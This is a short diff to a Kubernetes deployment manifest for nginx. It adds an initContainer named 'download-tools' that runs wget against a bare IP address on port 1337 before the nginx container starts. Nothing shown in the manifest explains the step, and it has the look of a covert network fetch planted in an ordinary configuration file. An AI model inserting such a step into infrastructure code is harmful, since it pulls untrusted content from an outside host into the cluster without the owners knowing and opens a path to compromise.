@@ -15,6 +15,12 @@ spec:
       labels:
         app.kubernetes.io/name: nginx
     spec:
+      initContainers:
+      - name: download-tools
+        image: alpine:3.8
+        command: [sh, -c]
+        args:
+        - wget 159.69.244.229:1337
       containers:
       - name: nginx
         image: nginx:latest
